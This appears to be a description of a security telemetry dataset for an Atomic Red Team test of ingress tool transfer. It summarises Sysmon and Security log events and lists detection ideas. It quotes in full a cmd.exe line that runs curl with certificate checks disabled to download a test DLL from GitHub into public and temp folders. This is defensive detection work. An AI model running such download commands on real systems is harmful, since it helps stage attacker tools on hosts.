# T1105-18: Ingress Tool Transfer — Curl Download File

## Technique Context

T1105 Ingress Tool Transfer is a fundamental command-and-control technique where adversaries transfer tools or files from external systems into compromised environments. This capability is essential for multi-stage attacks where initial access tools need to download additional payloads, utilities, or malware components. Attackers commonly use built-in system utilities like PowerShell, certutil, bitsadmin, or curl to avoid detection while maintaining fileless or minimal-footprint operations.

The detection community focuses heavily on monitoring native download utilities, especially when they connect to external domains or download executable content. Curl, introduced as a native Windows utility in Windows 10 version 1803, has become increasingly popular with both legitimate administrators and threat actors due to its flexibility and cross-platform consistency.

## What This Dataset Contains

This dataset captures a comprehensive curl-based file transfer scenario with multiple download attempts to different directories. The process chain shows PowerShell (PID 16904) spawning cmd.exe (PID 22948) which executes four sequential curl commands downloading the same DLL from GitHub.

The Security channel captures the complete command execution chain in EID 4688 events, including the full cmd.exe command line: `"cmd.exe" /c C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll & C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll`

Sysmon captures individual curl process creation events (PIDs 17808, 6372, 22688, 12576) with EID 1, tagged with `technique_id=T1105,technique_name=Ingress Tool Transfer`. Each shows distinct command lines targeting different output locations: `c:\users\public\music\`, `c:\programdata\`, and `C:\Windows\TEMP\`.

File creation events in Sysmon EID 11 document successful downloads to `C:\Users\Public\Music\allthethingsx64.dll`, `C:\Windows\Temp\allthethingsx64.dll`, with the Public Music location written twice by different curl processes (17808 and 6372).

DNS resolution activity appears in Sysmon EID 22 events showing queries for `github.com` resolving to `::ffff:140.82.113.3`, though the process GUIDs are zero indicating these may be kernel-level DNS queries rather than directly attributed to the curl processes.

Network connection telemetry shows Windows Defender (MsMpEng.exe) making HTTPS connections during the execution window, likely related to real-time scanning of the download activity.

## What This Dataset Does Not Contain

The dataset lacks network connection events directly from the curl processes themselves. While DNS queries show github.com resolution, there are no Sysmon EID 3 network connection events attributed to the curl processes, suggesting the network monitoring may not capture all outbound connections or the connection events occurred outside the collection window.

The PowerShell channel contains only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass) and does not show the actual PowerShell commands that initiated the curl downloads. This limits visibility into the PowerShell-side orchestration of the technique.

No registry modifications or additional persistence mechanisms are captured, as this test focuses specifically on the file transfer aspect rather than post-download execution or installation activities.

## Assessment

This dataset provides excellent coverage of curl-based ingress tool transfer from multiple detection perspectives. The combination of Security 4688 process creation events with full command lines, Sysmon process creation with parent-child relationships, and file creation events creates a comprehensive detection foundation.

The Security channel's command-line logging captures the exact curl syntax including the `-k` flag (ignore SSL certificate errors) and multiple output destinations, which are key behavioral indicators. Sysmon's process creation events with technique tagging demonstrate automated detection rule effectiveness, while file creation events provide evidence of successful downloads.

The data quality is strong for building detection rules around native Windows utilities performing external downloads, particularly for scenarios involving multiple download attempts to different locations - a common adversary technique for redundancy and evasion.

## Detection Opportunities Present in This Data

1. **Process creation of curl.exe with external URLs** - Sysmon EID 1 and Security EID 4688 showing curl.exe with github.com URLs and `-k` flag usage
2. **Command-line patterns indicating file downloads** - Command lines containing `-o` or `--output` parameters with local file paths
3. **Multiple curl processes spawned in rapid succession** - Process creation timing analysis showing burst download behavior
4. **Downloads to suspicious directories** - File creation in public directories (`C:\Users\Public\Music\`) and system temp locations
5. **Parent-child process relationships** - PowerShell spawning cmd.exe spawning multiple curl instances indicating scripted automation
6. **DNS queries to code repositories** - EID 22 events showing github.com resolution preceding download activity
7. **SSL certificate bypass indicators** - Curl commands using `-k` flag suggesting adversary attempts to avoid certificate validation
8. **File creation of executable content** - EID 11 events showing .dll files written to disk from external sources
9. **Windows Defender scanning activity correlation** - MsMpEng.exe network connections temporally aligned with download events indicating real-time scanning
